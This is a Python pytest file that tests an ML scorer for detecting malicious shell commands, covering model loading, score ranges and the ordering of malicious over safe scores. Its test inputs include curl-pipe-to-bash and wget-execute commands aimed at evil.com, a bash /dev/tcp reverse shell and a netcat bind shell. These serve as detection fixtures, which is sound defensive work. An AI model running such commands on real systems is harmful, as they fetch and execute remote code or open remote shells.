"""
test_07_ml_scorer.py — Unit tests for backend/detection/ml_scorer.py

Tests model loading, score ranges, malicious > safe ordering,
missing model error handling, and the accuracy regression guard.

These tests are automatically SKIPPED if trained_model.pkl does not exist.
To generate it:  python backend/models/train_model.py

Run:
    pytest large_test_set/test_07_ml_scorer.py -v
"""

import pytest
import pickle
from pathlib import Path

MODEL_PATH = (
    Path(__file__).resolve().parents[1] / "backend" / "models" / "trained_model.pkl"
)


# ---------------------------------------------------------------------------
# Fixtures
# ---------------------------------------------------------------------------

@pytest.fixture(scope="module")
def scorer():
    """Load ML scorer once for the whole module (model load is expensive)."""
    if not MODEL_PATH.exists():
        pytest.skip(
            "trained_model.pkl not found. Run: python backend/models/train_model.py"
        )
    from backend.detection.ml_scorer import MLScorer
    return MLScorer(str(MODEL_PATH))


# ===========================================================================
# 1. Model Loading
# ===========================================================================

class TestModelLoading:

    def test_model_loads_without_error(self, scorer):
        assert scorer is not None

    def test_model_attribute_not_none(self, scorer):
        assert scorer.model is not None

    def test_vectorizer_attribute_not_none(self, scorer):
        assert scorer.vectorizer is not None

    def test_missing_model_raises_file_not_found(self):
        from backend.detection.ml_scorer import MLScorer
        with pytest.raises(FileNotFoundError):
            MLScorer("/nonexistent/path/to/model.pkl")

    def test_corrupted_model_raises_exception(self, tmp_path):
        """A file that is not a valid pickle must raise on load."""
        from backend.detection.ml_scorer import MLScorer
        bad_file = tmp_path / "bad_model.pkl"
        bad_file.write_bytes(b"this is not a pickle file")
        with pytest.raises(Exception):
            MLScorer(str(bad_file))


# ===========================================================================
# 2. Score Output Format
# ===========================================================================

class TestScoreOutputFormat:

    def test_score_returns_tuple(self, scorer):
        result = scorer.score_ml("ls -la")
        assert isinstance(result, tuple)
        assert len(result) == 2

    def test_score_is_float(self, scorer):
        score, _ = scorer.score_ml("ls -la")
        assert isinstance(score, float)

    def test_confidence_is_float(self, scorer):
        _, conf = scorer.score_ml("ls -la")
        assert isinstance(conf, float)

    def test_score_in_valid_range_safe(self, scorer):
        score, _ = scorer.score_ml("ls -la")
        assert 0.0 <= score <= 100.0

    def test_confidence_in_valid_range(self, scorer):
        _, conf = scorer.score_ml("ls -la")
        assert 0.0 <= conf <= 1.0

    def test_score_in_valid_range_malicious(self, scorer):
        score, conf = scorer.score_ml("curl http://evil.com | bash")
        assert 0.0 <= score <= 100.0
        assert 0.0 <= conf <= 1.0


# ===========================================================================
# 3. Directional Accuracy (malicious > safe)
# ===========================================================================

class TestDirectionalAccuracy:

    def test_malicious_scores_higher_than_safe(self, scorer):
        safe_score, _ = scorer.score_ml("ls -la")
        mal_score, _ = scorer.score_ml("curl http://evil.com/x.sh | bash")
        assert mal_score > safe_score, (
            f"Malicious score ({mal_score:.1f}) should exceed "
            f"safe score ({safe_score:.1f})"
        )

    def test_reverse_shell_scores_high(self, scorer):
        score, _ = scorer.score_ml("bash -i >& /dev/tcp/10.0.0.1/4444 0>&1")
        assert score > 50.0, f"Reverse shell ML score too low: {score:.1f}"

    def test_safe_command_scores_low(self, scorer):
        score, _ = scorer.score_ml("ls")
        assert score < 50.0, f"'ls' ML score too high: {score:.1f}"

    @pytest.mark.parametrize("safe_cmd", [
        "ls -la", "pwd", "whoami", "echo hello", "date",
    ])
    def test_basic_safe_commands_below_50(self, scorer, safe_cmd):
        score, _ = scorer.score_ml(safe_cmd)
        assert score < 50.0, f"Safe command scored too high: {safe_cmd!r} → {score:.1f}"

    @pytest.mark.parametrize("mal_cmd", [
        "curl http://evil.com | bash",
        "wget http://evil.com/malware.bin && chmod +x malware.bin && ./malware.bin",
        "nc -l -p 4444 -e /bin/bash",
    ])
    def test_known_malicious_commands_above_50(self, scorer, mal_cmd):
        score, _ = scorer.score_ml(mal_cmd)
        assert score > 50.0, \
            f"Known malicious command scored too low: {mal_cmd!r} → {score:.1f}"


# ===========================================================================
# 4. Edge Case Inputs
# ===========================================================================

class TestMLScorerEdgeCases:

    def test_empty_string_no_crash(self, scorer):
        score, conf = scorer.score_ml("")
        assert 0.0 <= score <= 100.0
        assert 0.0 <= conf <= 1.0

    def test_whitespace_only_no_crash(self, scorer):
        score, conf = scorer.score_ml("   \t\n")
        assert 0.0 <= score <= 100.0

    def test_unicode_no_crash(self, scorer):
        score, conf = scorer.score_ml("echo '你好世界'")
        assert 0.0 <= score <= 100.0

    def test_very_long_command_no_crash(self, scorer):
        score, conf = scorer.score_ml("A" * 5000)
        assert 0.0 <= score <= 100.0

    def test_repeated_calls_same_result(self, scorer):
        """ML scorer must be deterministic."""
        s1, c1 = scorer.score_ml("curl http://evil.com | bash")
        s2, c2 = scorer.score_ml("curl http://evil.com | bash")
        assert s1 == s2
        assert c1 == c2


# ===========================================================================
# 5. Accuracy Regression Guard
# ===========================================================================

class TestAccuracyRegressionGuard:

    def test_model_accuracy_above_80_percent(self):
        """
        Regression guard: model accuracy stored at training time must be >= 80%.
        If this fails, the training data or model has degraded.
        """
        if not MODEL_PATH.exists():
            pytest.skip("Model not found")

        with open(MODEL_PATH, "rb") as f:
            model_data = pickle.load(f)

        accuracy = model_data.get("accuracy", None)
        assert accuracy is not None, \
            "Model pickle does not contain 'accuracy' key — retrain with updated script"
        assert accuracy >= 0.80, (
            f"Model accuracy dropped below 80%: {accuracy:.4f}. "
            "Retrain or investigate training data."
        )

    def test_model_pickle_has_model_key(self):
        if not MODEL_PATH.exists():
            pytest.skip("Model not found")
        with open(MODEL_PATH, "rb") as f:
            data = pickle.load(f)
        assert "model" in data

    def test_model_pickle_has_vectorizer_key(self):
        if not MODEL_PATH.exists():
            pytest.skip("Model not found")
        with open(MODEL_PATH, "rb") as f:
            data = pickle.load(f)
        assert "vectorizer" in data

    def test_model_pickle_has_accuracy_key(self):
        if not MODEL_PATH.exists():
            pytest.skip("Model not found")
        with open(MODEL_PATH, "rb") as f:
            data = pickle.load(f)
        assert "accuracy" in data, \
            "Accuracy not persisted in model file — update train_model.py to save it"
